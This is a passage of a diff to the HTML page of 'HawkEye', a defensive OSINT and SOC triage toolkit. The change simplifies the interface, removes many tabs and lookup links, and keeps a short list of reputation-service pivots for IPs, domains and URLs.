@@ -3,1631 +3,232 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="Centralized OSINT & SOC Toolkit — IOC investigation, log triage, threat intelligence, and incident response tools for cybersecurity analysts." />
-  <meta name="robots" content="noindex, nofollow" />
-  <!-- Prevent the browser from sending investigated IOCs as Referer headers to external tools -->
+  <meta name="description" content="HawkEye - OSINT and SOC triage toolkit" />
   <meta name="referrer" content="no-referrer" />
-  <!-- Basic Content Security Policy — allows the tool to function while blocking unexpected scripts -->
-  <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src *; img-src * data:; font-src *;" />
-  <title>HawkEye — OSINT &amp; Threat Intel Toolkit</title>
+  <title>HawkEye — Threat Intel Toolkit</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-
-  <div class="sidebar">
+  <aside class="sidebar">
     <div class="brand">
-      <svg width="100%" viewBox="0 0 200 76" xmlns="http://www.w3.org/2000/svg" style="display:block;max-width:190px;margin:0 auto;">
-        <!-- Feather hints -->
-        <path d="M42 35 Q58 22 72 28" fill="none" stroke="var(--muted)" stroke-width="0.5" opacity="0.4"/>
-        <path d="M118 35 Q102 22 88 28" fill="none" stroke="var(--muted)" stroke-width="0.5" opacity="0.4"/>
-        <!-- Iris rings -->
-        <circle cx="80" cy="35" r="15" fill="none" stroke="#1D9E75" stroke-width="0.5" opacity="0.3"/>
-        <circle cx="80" cy="35" r="11" fill="#0F6E56" fill-opacity="0.1"/>
-        <circle cx="80" cy="35" r="11" fill="none" stroke="#1D9E75" stroke-width="0.8" opacity="0.55"/>
-        <!-- Reticle crosshair -->
-        <circle cx="80" cy="35" r="6" fill="none" stroke="#1D9E75" stroke-width="0.8" opacity="0.7"/>
-        <line x1="80" y1="26" x2="80" y2="29" stroke="#1D9E75" stroke-width="1" stroke-linecap="round"/>
-        <line x1="80" y1="41" x2="80" y2="44" stroke="#1D9E75" stroke-width="1" stroke-linecap="round"/>
-        <line x1="71" y1="35" x2="74" y2="35" stroke="#1D9E75" stroke-width="1" stroke-linecap="round"/>
-        <line x1="86" y1="35" x2="89" y2="35" stroke="#1D9E75" stroke-width="1" stroke-linecap="round"/>
-        <!-- Pupil + specular -->
-        <circle cx="80" cy="35" r="3" fill="#085041"/>
-        <circle cx="81.5" cy="33.5" r="1" fill="#9FE1CB" opacity="0.9"/>
-        <!-- Eyelid arcs -->
-        <path d="M42 35 Q62 14 80 14 Q98 14 118 35" fill="none" stroke="var(--text)" stroke-width="1.2" stroke-linecap="round" opacity="0.8"/>
-        <path d="M42 35 Q62 56 80 56 Q98 56 118 35" fill="none" stroke="var(--text)" stroke-width="1.2" stroke-linecap="round" opacity="0.8"/>
-        <!-- Corner dots -->
-        <circle cx="42" cy="35" r="1.5" fill="var(--muted)" opacity="0.6"/>
-        <circle cx="118" cy="35" r="1.5" fill="var(--muted)" opacity="0.6"/>
-        <!-- HAWKEYE wordmark -->
-        <text x="100" y="63" font-family="Georgia, serif" font-size="11" font-weight="700" fill="var(--text)" letter-spacing="2" text-anchor="start">HAWKEYE</text>
-        <!-- Tagline below wordmark inside SVG -->
-        <text x="100" y="74" font-family="Georgia, serif" font-size="7.5" font-weight="400" fill="#1D9E75" letter-spacing="1.5" text-anchor="start" opacity="0.85">THREAT INTEL TOOLKIT</text>
-      </svg>
-    </div>
-
-    <!-- Sensitivity reminder — always visible -->
-    <div style="margin:8px 10px 0;padding:6px 10px;background:rgba(251,146,60,0.08);border:1px solid rgba(251,146,60,0.25);border-radius:8px;font-size:9px;color:#fb923c;line-height:1.5;">
-      ⚠️ <strong>Sensitive data reminder:</strong> Do not paste credentials, PII, or classified IOCs. Tool runs locally — no data is sent to any server except direct tool lookups you initiate.
-    </div>
-
-    <!-- Clipboard Watcher Toggle (Feature 10) -->
-    <div style="margin:8px 10px 0;padding:6px 10px;background:var(--bg2);border:1px solid var(--border);border-radius:8px;display:flex;align-items:center;justify-content:space-between;gap:8px;">
+      <div class="logo">👁</div>
       <div>
-        <div style="font-size:10px;font-weight:700;color:var(--text);">👁 Clipboard Watcher</div>
-        <div style="font-size:9px;color:var(--muted);" id="clip-watch-status">Auto-detect IOCs you copy</div>
+        <h2>HawkEye</h2>
+        <p>Threat Intel Toolkit</p>
       </div>
-      <label style="position:relative;width:34px;height:18px;flex-shrink:0;cursor:pointer;">
-        <input type="checkbox" id="clip-watch-toggle" style="opacity:0;width:0;height:0;position:absolute;">
-        <span id="clip-watch-track" style="position:absolute;inset:0;background:var(--border);border-radius:9px;transition:background 0.2s;"></span>
-        <span id="clip-watch-thumb" style="position:absolute;top:2px;left:2px;width:14px;height:14px;background:#fff;border-radius:50%;transition:transform 0.2s;box-shadow:0 1px 3px rgba(0,0,0,0.3);"></span>
-      </label>
     </div>
 
     <div class="actions">
       <button id="toggle-dark" type="button">🌙 Toggle Theme</button>
       <button id="clear-all" type="button">🗑 Clear</button>
-      <button id="export-history" type="button">📤 Export History</button>
-    </div>
-
-    <!-- Session History -->
-    <div class="sidebar-section">
-      <div class="sidebar-section-head" style="display:flex;align-items:center;justify-content:space-between">
-        <span>🕓 IOC History <span style="font-size:10px;opacity:.6;font-weight:400">(persists across sessions)</span></span>
-        <button id="clear-history" type="button" style="font-size:10px;padding:2px 8px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--muted);cursor:pointer" title="Clear all history">✕ Clear</button>
-      </div>
-      <div id="history-list" class="history-list">
-        <div class="history-empty">No searches yet.</div>
-      </div>
-    </div>
-
-    <!-- Active Case Indicator -->
-    <div class="sidebar-section" id="case-indicator-section" style="display:none">
-      <div class="sidebar-section-head">📁 Active Case</div>
-      <div id="case-indicator" class="case-indicator"></div>
     </div>
 
     <div class="hint">
-      Landing page shows all tools.<br />
-      Search input shows only relevant OSINT.<br />
-      <strong>Shortcuts:</strong> Enter=Search · Ctrl+D=Defang · Ctrl+E=Extract · Ctrl+K=Focus · Ctrl+H=Hash File
+      Paste an IOC, URL, CVE, email address, or raw email headers.<br />
+      Search shows only the most relevant pivots and an analyst-style triage.
     </div>
-    <!-- Version footer in sidebar -->
-    <div style="margin-top:auto;padding:10px 12px 14px;border-top:1px solid var(--border);font-size:9px;color:var(--muted);line-height:1.7;">
-      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
-        <span style="font-weight:700;color:var(--text)">HawkEye</span>
-        <span id="toolkit-version-badge" style="background:rgba(56,189,248,0.1);color:#38bdf8;border:1px solid rgba(56,189,248,0.25);border-radius:20px;padding:1px 7px;font-weight:700;font-size:9px;">v2.0.0</span>
-      </div>
-      <div>📦 All processing is local. IOC history stored in this browser only.</div>
-      <div>🔗 Tool lookups open external sites — you initiate each one.</div>
-      <div>📡 RDAP domain age lookup requires your confirmation.</div>
-    </div>
-  </div>
+  </aside>
 
-  <div class="main">
-    <div class="header">
+  <main class="main">
+    <header class="header">
       <div>
         <h1>HawkEye</h1>
-        <div class="hawk-tagline">Investigate faster. Detect smarter. Respond with precision.</div>
-        <div class="sub">IOC Investigation · Log Triage · Threat Intel · Incident Response</div>
+        <div class="sub">IOC Investigation · Auto Triage · Safe Pivots</div>
       </div>
-      <!-- Tab switcher -->
+
       <div class="tab-bar">
         <button class="tab-btn active" data-tab="single" type="button">🔍 Single IOC</button>
-        <button class="tab-btn" data-tab="bulk" type="button">📋 Bulk IOC</button>
-        <button class="tab-btn" data-tab="script" type="button">⚡ Script Analyzer</button>
-        <button class="tab-btn" data-tab="writeup" type="button">📝 Alert Write-up</button>
-        <button class="tab-btn" data-tab="case" type="button">📁 Case Manager</button>
-        <button class="tab-btn" data-tab="timeline" type="button">⏱ Timeline</button>
-        <button class="tab-btn" data-tab="hashfile" type="button">🔑 Hash File</button>
-        <button class="tab-btn" data-tab="defangbulk" type="button">🛡 Defang/Refang</button>
-        <button class="tab-btn" data-tab="yara" type="button">📜 YARA/Sigma</button>
-        <button class="tab-btn" data-tab="logtriage" type="button">🧾 Log Triage</button>
-        <button class="tab-btn" data-tab="threat" type="button">🕵 Threat Actor</button>
-        <button class="tab-btn" data-tab="custom" type="button">⚙ Custom Tools</button>
-        <button class="tab-btn" data-tab="utils" type="button">🛠 SOC Utils</button>
-        <button class="tab-btn" data-tab="cti" type="button">🌐 CTI Feed</button>
+        <button class="tab-btn" data-tab="bulk" type="button">📋 Bulk Extract</button>
       </div>
-    </div>
+    </header>
 
-    <!-- ===== SINGLE IOC TAB ===== -->
-    <div id="tab-single" class="tab-panel active">
+    <section id="tab-single" class="tab-panel active">
       <div class="input-panel">
         <div class="input-row">
           <div class="searchbox" id="searchbox">
             <div class="search-ico">🔎</div>
-            <input id="input" type="text"
-              placeholder="Enter IP / IPv6 / Domain / URL / Email / Username / Hash / CVE / Event ID / Txxxx or paste Email Headers / logs"
-              autocomplete="off" spellcheck="false" />
+            <input
+              id="input"
+              type="text"
+              placeholder="Enter IP / Domain / URL / Email / Hash / CVE / Txxxx or paste email headers"
+              autocomplete="off"
+              spellcheck="false"
+            />
             <button id="clear-input" class="clear-input" type="button" aria-label="Clear">✕</button>
           </div>
           <button id="search-btn" type="button">Search</button>
         </div>
 
         <div class="tools">
-          <button id="defang-btn" type="button" title="Ctrl+D">Defang</button>
+          <button id="defang-btn" type="button">Defang</button>
           <button id="refang-btn" type="button">Refang</button>
-          <button id="extract-btn" type="button" title="Ctrl+E">Extract IOCs</button>
-          <button id="copy-btn" type="button">Copy</button>
-          <button id="add-to-case-btn" type="button" title="Add current IOC to active case">📁 Add to Case</button>
+          <button id="extract-btn" type="button">Extract IOCs</button>
+          <button id="copy-btn" type="button">Copy Output</button>
         </div>
 
         <div id="status" class="status">
-          <span>Status: ready (landing page)</span>
+          <span>Status: ready</span>
           <span class="badge">OSINT</span>
         </div>
 
-        <!-- Verdict Banner -->
-        <div id="verdict-banner" class="verdict-banner" style="display:none"></div>
-
-        <!-- Quick Threat Assessment Banner -->
-        <div id="threat-score-panel" class="threat-score-panel" style="display:none">
-          <div class="ts-banner" id="ts-banner-toggle">
-            <span class="ts-banner-label">⚡ Quick Assessment</span>
-            <span id="ts-overall-badge" class="ts-overall-badge">—</span>
-            <div class="ts-pill-row" id="ts-pill-row"></div>
-            <span class="ts-toggle" id="ts-toggle-arrow">▼</span>
-          </div>
-          <div id="ts-body" class="ts-body"></div>
-        </div>
-
-        <!-- Auto Triage Panel -->
-        <div id="auto-triage-panel" class="auto-triage-panel" style="display:none">
-          <div class="auto-triage-head">
+        <div id="analyst-triage-panel" class="analyst-triage-panel" style="display:none">
+          <div class="analyst-triage-head">
             <div>
-              <div class="auto-triage-title">🧠 Auto Triage</div>
-              <div class="auto-triage-sub">Analyst-style investigation summary</div>
+              <div class="analyst-triage-title">🧠 Analyst Auto Triage</div>
+              <div class="analyst-triage-sub">Initial investigation summary</div>
             </div>
-            <div class="auto-triage-actions">
-              <button id="auto-triage-copy" type="button">📋 Copy</button>
-            </div>
+            <button id="analyst-triage-copy" type="button" class="analyst-triage-copy-btn">Copy</button>
           </div>
-          <div id="auto-triage-body" class="auto-triage-body"></div>
+          <div id="analyst-triage-body" class="analyst-triage-body"></div>
         </div>
 
-        <!-- CVE Enrichment Panel -->
-        <div id="cve-enrichment" class="cve-enrichment" style="display:none"></div>
-
-        <!-- Threat Actor Hint Panel (Feature 14) -->
-        <div id="actor-hint-panel" class="actor-hint-panel" style="display:none"></div>
-
-        <textarea id="output" placeholder="Results / Extracted IOCs (Tip: Paste full email headers/logs here then press Search or Extract IOCs)"></textarea>
-        <div class="hintline">Tip: Paste full email headers/logs into the Output box then press Search (or Extract IOCs).</div>
+        <textarea
+          id="output"
+          placeholder="Results / extracted IOCs / notes. You can also paste full email headers here."
+        ></textarea>
       </div>
 
-      <!-- ===================== IP ===================== -->
-      <div class="tool-section" data-type="ip">
-        <div class="section-head"><h2>🛡 Threat & Reputation (IP)</h2><div class="pill">IP pivots</div></div>
+      <div id="landing-note" class="landing-note">
+        Enter an IOC above to show the relevant investigation pivots.
+      </div>
+
+      <section class="tool-section" data-type="ip">
+        <div class="section-head">
+          <h2>🌐 IP Intelligence</h2>
+          <div class="pill">IP pivots</div>
+        </div>
         <div class="tool-grid">
-          <a id="ip_vt" target="_blank"><div class="title">🧪 VirusTotal <span class="lock">🔒</span></div><div class="meta" data-meta="ip_vt"></div></a>
-          <a id="ip_abuseipdb" target="_blank"><div class="title">🚫 AbuseIPDB <span class="lock">🔒</span></div><div class="meta" data-meta="ip_abuseipdb"></div></a>
-          <a id="ip_talos" target="_blank"><div class="title">🕵️ Talos <span class="lock">🔒</span></div><div class="meta" data-meta="ip_talos"></div></a>
-          <a id="ip_ibmxf" target="_blank"><div class="title">🧠 IBM X-Force <span class="lock">🔒</span></div><div class="meta" data-meta="ip_ibmxf"></div></a>
-          <a id="ip_otx" target="_blank"><div class="title">👽 AlienVault OTX <span class="lock">🔒</span></div><div class="meta" data-meta="ip_otx"></div></a>
-          <a id="ip_anyrun" target="_blank"><div class="title">🏃 AnyRun (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_anyrun"></div></a>
-          <a id="ip_mxtoolbox" target="_blank"><div class="title">📧 MXToolBox (Blacklist) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_mxtoolbox"></div></a>
-          <a id="ip_blacklistchecker" target="_blank"><div class="title">🧱 Blacklist Checker <span class="lock">🔒</span></div><div class="meta" data-meta="ip_blacklistchecker"></div></a>
-          <a id="ip_cleantalk" target="_blank"><div class="title">🧼 CleanTalk (Blacklist) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_cleantalk"></div></a>
-          <a id="ip_shodan" target="_blank"><div class="title">🛰 Shodan <span class="lock">🔒</span></div><div class="meta" data-meta="ip_shodan"></div></a>
-          <a id="ip_censys" target="_blank"><div class="title">🔭 Censys <span class="lock">🔒</span></div><div class="meta" data-meta="ip_censys"></div></a>
-          <a id="ip_greynoise" target="_blank"><div class="title">🌫 GreyNoise <span class="lock">🔒</span></div><div class="meta" data-meta="ip_greynoise"></div></a>
-          <a id="ip_iplocation" target="_blank"><div class="title">📍 IPLocation <span class="lock">🔒</span></div><div class="meta" data-meta="ip_iplocation"></div></a>
-          <a id="ip_ipinfo" target="_blank"><div class="title">🗺 IPinfo <span class="lock">🔒</span></div><div class="meta" data-meta="ip_ipinfo"></div></a>
-          <a id="ip_whatismyipaddress" target="_blank"><div class="title">🧾 WhatIsMyIPAddress <span class="lock">🔒</span></div><div class="meta" data-meta="ip_whatismyipaddress"></div></a>
-          <a id="ip_myip" target="_blank"><div class="title">🧷 myip.ms <span class="lock">🔒</span></div><div class="meta" data-meta="ip_myip"></div></a>
-          <a id="ip_spur" target="_blank"><div class="title">🕳 SPUR (VPN detect) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_spur"></div></a>
-          <a id="ip_clickfix" target="_blank"><div class="title">🧲 ClickFix Hunter <span class="lock">🔒</span></div><div class="meta" data-meta="ip_clickfix"></div></a>
-          <a id="ip_ripestat" target="_blank"><div class="title">🗃 RIPEstat <span class="lock">🔒</span></div><div class="meta" data-meta="ip_ripestat"></div></a>
-          <a id="ip_bgphe" target="_blank"><div class="title">🌐 BGP.he.net (ASN) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_bgphe"></div></a>
-          <a id="ip_nitter" target="_blank"><div class="title">🐦 Nitter (Tweets) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_nitter"></div></a>
-          <a id="ip_threatminer" target="_blank"><div class="title">⛏ ThreatMiner <span class="lock">🔒</span></div><div class="meta" data-meta="ip_threatminer"></div></a>
-          <a id="ip_urlscan" target="_blank"><div class="title">🔎 urlscan.io <span class="lock">🔒</span></div><div class="meta" data-meta="ip_urlscan"></div></a>
-          <a id="ip_viewdns" target="_blank"><div class="title">🧩 ViewDNS IP History <span class="lock">🔒</span></div><div class="meta" data-meta="ip_viewdns"></div></a>
-          <a id="ip_scamalytics" target="_blank"><div class="title">🎭 Scamalytics <span class="lock">🔒</span></div><div class="meta" data-meta="ip_scamalytics"></div></a>
-          <a id="ip_threatfox" target="_blank"><div class="title">🦊 ThreatFox (C2) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_threatfox"></div></a>
-          <a id="ip_pulsedive" target="_blank"><div class="title">📡 Pulsedive <span class="lock">🔒</span></div><div class="meta" data-meta="ip_pulsedive"></div></a>
-          <a id="ip_securitytrails" target="_blank"><div class="title">🧭 SecurityTrails (rDNS) <span class="lock">🔒</span></div><div class="meta" data-meta="ip_securitytrails"></div></a>
+          <a id="ip_vt" target="_blank" rel="noopener noreferrer"><div class="title">VirusTotal</div><div class="meta" data-meta="ip_vt"></div></a>
+          <a id="ip_abuseipdb" target="_blank" rel="noopener noreferrer"><div class="title">AbuseIPDB</div><div class="meta" data-meta="ip_abuseipdb"></div></a>
+          <a id="ip_otx" target="_blank" rel="noopener noreferrer"><div class="title">AlienVault OTX</div><div class="meta" data-meta="ip_otx"></div></a>
+          <a id="ip_talos" target="_blank" rel="noopener noreferrer"><div class="title">Cisco Talos</div><div class="meta" data-meta="ip_talos"></div></a>
+          <a id="ip_xforce" target="_blank" rel="noopener noreferrer"><div class="title">IBM X-Force</div><div class="meta" data-meta="ip_xforce"></div></a>
+          <a id="ip_shodan" target="_blank" rel="noopener noreferrer"><div class="title">Shodan</div><div class="meta" data-meta="ip_shodan"></div></a>
+          <a id="ip_greynoise" target="_blank" rel="noopener noreferrer"><div class="title">GreyNoise</div><div class="meta" data-meta="ip_greynoise"></div></a>
+          <a id="ip_mxtoolbox" target="_blank" rel="noopener noreferrer"><div class="title">MXToolbox</div><div class="meta" data-meta="ip_mxtoolbox"></div></a>
         </div>
-      </div>
+      </section>
 
-      <!-- ===================== DOMAIN ===================== -->
-      <div class="tool-section" data-type="domain">
-        <div class="section-head"><h2>🌐 Domain & DNS</h2><div class="pill">Domain pivots</div></div>
+      <section class="tool-section" data-type="domain">
+        <div class="section-head">
+          <h2>🌍 Domain Intelligence</h2>
+          <div class="pill">Domain pivots</div>
+        </div>
         <div class="tool-grid">
-          <a id="dom_vt" target="_blank"><div class="title">🧪 VirusTotal <span class="lock">🔒</span></div><div class="meta" data-meta="dom_vt"></div></a>
-          <a id="dom_talos" target="_blank"><div class="title">🕵️ Talos <span class="lock">🔒</span></div><div class="meta" data-meta="dom_talos"></div></a>
-          <a id="dom_ibmxf" target="_blank"><div class="title">🧠 IBM X-Force <span class="lock">🔒</span></div><div class="meta" data-meta="dom_ibmxf"></div></a>
-          <a id="dom_otx" target="_blank"><div class="title">👽 AlienVault OTX <span class="lock">🔒</span></div><div class="meta" data-meta="dom_otx"></div></a>
-          <a id="dom_urlscan" target="_blank"><div class="title">🔎 URLScan <span class="lock">🔒</span></div><div class="meta" data-meta="dom_urlscan"></div></a>
-          <a id="dom_mxtoolbox" target="_blank"><div class="title">📧 MXToolBox (Blacklist) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_mxtoolbox"></div></a>
-          <a id="dom_blacklistchecker" target="_blank"><div class="title">🧱 Blacklist Checker <span class="lock">🔒</span></div><div class="meta" data-meta="dom_blacklistchecker"></div></a>
-          <a id="dom_cleantalk_bl" target="_blank"><div class="title">🧼 CleanTalk (Blacklist) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_cleantalk_bl"></div></a>
-          <a id="dom_cleantalk_malware" target="_blank"><div class="title">🧼 CleanTalk (Malware Scan) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_cleantalk_malware"></div></a>
-          <a id="dom_sucuri" target="_blank"><div class="title">🛡 SUCURI (Malware Scan) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_sucuri"></div></a>
-          <a id="dom_urlvoid" target="_blank"><div class="title">🕸 URLVoid <span class="lock">🔒</span></div><div class="meta" data-meta="dom_urlvoid"></div></a>
-          <a id="dom_urlhaus" target="_blank"><div class="title">🏚 URLHaus <span class="lock">🔒</span></div><div class="meta" data-meta="dom_urlhaus"></div></a>
-          <a id="dom_whois" target="_blank"><div class="title">📇 WHOIS <span class="lock">🔒</span></div><div class="meta" data-meta="dom_whois"></div></a>
-          <a id="dom_dnslytics" target="_blank"><div class="title">🧬 DNSLytics <span class="lock">🔒</span></div><div class="meta" data-meta="dom_dnslytics"></div></a>
-          <a id="dom_netcraft" target="_blank"><div class="title">🏗 Netcraft <span class="lock">🔒</span></div><div class="meta" data-meta="dom_netcraft"></div></a>
-          <a id="dom_webcheck" target="_blank"><div class="title">🧪 Web Check <span class="lock">🔒</span></div><div class="meta" data-meta="dom_webcheck"></div></a>
-          <a id="dom_securitytrails" target="_blank"><div class="title">🧭 SecurityTrails <span class="lock">🔒</span></div><div class="meta" data-meta="dom_securitytrails"></div></a>
-          <a id="dom_hudsonrock_info" target="_blank"><div class="title">🧯 HudsonRock Infostealer <span class="lock">🔒</span></div><div class="meta" data-meta="dom_hudsonrock_info"></div></a>
-          <a id="dom_hudsonrock_urls" target="_blank"><div class="title">🧾 HudsonRock URL Discovery <span class="lock">🔒</span></div><div class="meta" data-meta="dom_hudsonrock_urls"></div></a>
-          <a id="dom_socradar" target="_blank"><div class="title">🕳 SOCRadar DarkWebReport <span class="lock">🔒</span></div><div class="meta" data-meta="dom_socradar"></div></a>
-          <a id="dom_wayback" target="_blank"><div class="title">🕰 Wayback Machine <span class="lock">🔒</span></div><div class="meta" data-meta="dom_wayback"></div></a>
-          <a id="dom_wayback_save" target="_blank"><div class="title">💾 Wayback (Save) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_wayback_save"></div></a>
-          <a id="dom_browserling" target="_blank"><div class="title">🧊 Browserling <span class="lock">🔒</span></div><div class="meta" data-meta="dom_browserling"></div></a>
-          <a id="dom_anyrun" target="_blank"><div class="title">🏃 AnyRun (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_anyrun"></div></a>
-          <a id="dom_anyrun_safe" target="_blank"><div class="title">🧯 AnyRun (Submit) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_anyrun_safe"></div></a>
-          <a id="dom_phishing_checker" target="_blank"><div class="title">🎣 Phishing Checker <span class="lock">🔒</span></div><div class="meta" data-meta="dom_phishing_checker"></div></a>
-          <a id="dom_clickfix" target="_blank"><div class="title">🧲 ClickFix Hunter <span class="lock">🔒</span></div><div class="meta" data-meta="dom_clickfix"></div></a>
-          <a id="dom_nitter" target="_blank"><div class="title">🐦 Nitter (Tweets) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_nitter"></div></a>
-          <a id="dom_netlas" target="_blank"><div class="title">🧿 Netlas <span class="lock">🔒</span></div><div class="meta" data-meta="dom_netlas"></div></a>
-          <a id="dom_censys" target="_blank"><div class="title">🔭 Censys <span class="lock">🔒</span></div><div class="meta" data-meta="dom_censys"></div></a>
-          <a id="dom_shodan" target="_blank"><div class="title">🛰 Shodan <span class="lock">🔒</span></div><div class="meta" data-meta="dom_shodan"></div></a>
-          <a id="dom_dnstools" target="_blank"><div class="title">📇 WHOIS DomainTools <span class="lock">🔒</span></div><div class="meta" data-meta="dom_dnstools"></div></a>
-          <a id="dom_crtsh" target="_blank"><div class="title">🔐 crt.sh (Cert Transparency) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_crtsh"></div></a>
-          <a id="dom_dnsdumpster" target="_blank"><div class="title">🗺 DNSDumpster <span class="lock">🔒</span></div><div class="meta" data-meta="dom_dnsdumpster"></div></a>
-          <a id="dom_threatfox" target="_blank"><div class="title">🦊 ThreatFox <span class="lock">🔒</span></div><div class="meta" data-meta="dom_threatfox"></div></a>
-          <a id="dom_pulsedive" target="_blank"><div class="title">📡 Pulsedive <span class="lock">🔒</span></div><div class="meta" data-meta="dom_pulsedive"></div></a>
-          <a id="dom_passivedns" target="_blank"><div class="title">🕰 Passive DNS History <span class="lock">🔒</span></div><div class="meta" data-meta="dom_passivedns"></div></a>
-          <a id="dom_rdap" target="_blank"><div class="title">📇 RDAP (Reg Age) <span class="lock">🔒</span></div><div class="meta" data-meta="dom_rdap"></div></a>
+          <a id="dom_vt" target="_blank" rel="noopener noreferrer"><div class="title">VirusTotal</div><div class="meta" data-meta="dom_vt"></div></a>
+          <a id="dom_whois" target="_blank" rel="noopener noreferrer"><div class="title">WHOIS</div><div class="meta" data-meta="dom_whois"></div></a>
+          <a id="dom_dnsdumpster" target="_blank" rel="noopener noreferrer"><div class="title">DNSDumpster</div><div class="meta" data-meta="dom_dnsdumpster"></div></a>
+          <a id="dom_securitytrails" target="_blank" rel="noopener noreferrer"><div class="title">SecurityTrails</div><div class="meta" data-meta="dom_securitytrails"></div></a>
+          <a id="dom_otx" target="_blank" rel="noopener noreferrer"><div class="title">AlienVault OTX</div><div class="meta" data-meta="dom_otx"></div></a>
+          <a id="dom_urlscan" target="_blank" rel="noopener noreferrer"><div class="title">urlscan</div><div class="meta" data-meta="dom_urlscan"></div></a>
+          <a id="dom_crtsh" target="_blank" rel="noopener noreferrer"><div class="title">crt.sh</div><div class="meta" data-meta="dom_crtsh"></div></a>
+          <a id="dom_shodan" target="_blank" rel="noopener noreferrer"><div class="title">Shodan</div><div class="meta" data-meta="dom_shodan"></div></a>
         </div>
-      </div>
+      </section>
 
-      <!-- ===================== URL ANALYSIS ===================== -->
-      <div class="tool-section" data-type="url">
-        <div class="section-head"><h2>🔗 URL Analysis</h2><div class="pill">URL / Link pivots</div></div>
+      <section class="tool-section" data-type="url">
+        <div class="section-head">
+          <h2>🔗 URL Intelligence</h2>
+          <div class="pill">URL pivots</div>
+        </div>
         <div class="tool-grid">
-          <a id="url_vt" target="_blank"><div class="title">🧪 VirusTotal URL <span class="lock">🔒</span></div><div class="meta" data-meta="url_vt"></div></a>
-          <a id="url_urlscan" target="_blank"><div class="title">🔎 URLScan.io <span class="lock">🔒</span></div><div class="meta" data-meta="url_urlscan"></div></a>
-          <a id="url_urlvoid" target="_blank"><div class="title">🕸 URLVoid <span class="lock">🔒</span></div><div class="meta" data-meta="url_urlvoid"></div></a>
-          <a id="url_urlhaus" target="_blank"><div class="title">🏚 URLHaus <span class="lock">🔒</span></div><div class="meta" data-meta="url_urlhaus"></div></a>
-          <a id="url_phishtank" target="_blank"><div class="title">🎣 PhishTank <span class="lock">🔒</span></div><div class="meta" data-meta="url_phishtank"></div></a>
-          <a id="url_checkphish" target="_blank"><div class="title">🐟 CheckPhish <span class="lock">🔒</span></div><div class="meta" data-meta="url_checkphish"></div></a>
-          <a id="url_safebrowsing" target="_blank"><div class="title">🛡 Google Safe Browsing <span class="lock">🔒</span></div><div class="meta" data-meta="url_safebrowsing"></div></a>
-          <a id="url_sucuri" target="_blank"><div class="title">🧹 Sucuri SiteCheck <span class="lock">🔒</span></div><div class="meta" data-meta="url_sucuri"></div></a>
-          <a id="url_browserling" target="_blank"><div class="title">🧊 Browserling (Preview) <span class="lock">🔒</span></div><div class="meta" data-meta="url_browserling"></div></a>
-          <a id="url_wayback" target="_blank"><div class="title">🕰 Wayback Machine <span class="lock">🔒</span></div><div class="meta" data-meta="url_wayback"></div></a>
-          <a id="url_anyrun" target="_blank"><div class="title">🏃 AnyRun (Submit) <span class="lock">🔒</span></div><div class="meta" data-meta="url_anyrun"></div></a>
-          <a id="url_otx" target="_blank"><div class="title">👽 AlienVault OTX <span class="lock">🔒</span></div><div class="meta" data-meta="url_otx"></div></a>
-          <a id="url_threatfox" target="_blank"><div class="title">🦊 ThreatFox <span class="lock">🔒</span></div><div class="meta" data-meta="url_threatfox"></div></a>
-          <a id="url_netcraft" target="_blank"><div class="title">🏗 Netcraft <span class="lock">🔒</span></div><div class="meta" data-meta="url_netcraft"></div></a>
-          <a id="url_webcheck" target="_blank"><div class="title">🧪 Web Check <span class="lock">🔒</span></div><div class="meta" data-meta="url_webcheck"></div></a>
-          <a id="url_securitytrails" target="_blank"><div class="title">🧭 SecurityTrails <span class="lock">🔒</span></div><div class="meta" data-meta="url_securitytrails"></div></a>
-          <a id="url_hudsonrock_info" target="_blank"><div class="title">🧯 HudsonRock Infostealer <span class="lock">🔒</span></div><div class="meta" data-meta="url_hudsonrock_info"></div></a>
-          <a id="url_hudsonrock_urls" target="_blank"><div class="title">🧾 HudsonRock URL Discovery <span class="lock">🔒</span></div><div class="meta" data-meta="url_hudsonrock_urls"></div></a>
-          <a id="url_socradar" target="_blank"><div class="title">🕳 SOCRadar DarkWebReport <span class="lock">🔒</span></div><div class="meta" data-meta="url_socradar"></div></a>
-          <a id="url_wayback_save" target="_blank"><div class="title">💾 Wayback (Save) <span class="lock">🔒</span></div><div class="meta" data-meta="url_wayback_save"></div></a>
-          <a id="url_phishing_checker" target="_blank"><div class="title">🎣 Phishing Checker <span class="lock">🔒</span></div><div class="meta" data-meta="url_phishing_checker"></div></a>
-          <a id="url_clickfix" target="_blank"><div class="title">🧲 ClickFix Hunter <span class="lock">🔒</span></div><div class="meta" data-meta="url_clickfix"></div></a>
-          <a id="url_cyberchef" target="_blank"><div class="title">🧪 CyberChef <span class="lock">🔒</span></div><div class="meta" data-meta="url_cyberchef"></div></a>
-          <a id="url_nitter" target="_blank"><div class="title">🐦 Nitter (Tweets) <span class="lock">🔒</span></div><div class="meta" data-meta="url_nitter"></div></a>
+          <a id="url_vt" target="_blank" rel="noopener noreferrer"><div class="title">VirusTotal</div><div class="meta" data-meta="url_vt"></div></a>
+          <a id="url_urlscan" target="_blank" rel="noopener noreferrer"><div class="title">urlscan</div><div class="meta" data-meta="url_urlscan"></div></a>
+          <a id="url_google" target="_blank" rel="noopener noreferrer"><div class="title">Google Search</div><div class="meta" data-meta="url_google"></div></a>
+          <a id="url_wayback" target="_blank" rel="noopener noreferrer"><div class="title">Wayback Machine</div><div class="meta" data-meta="url_wayback"></div></a>
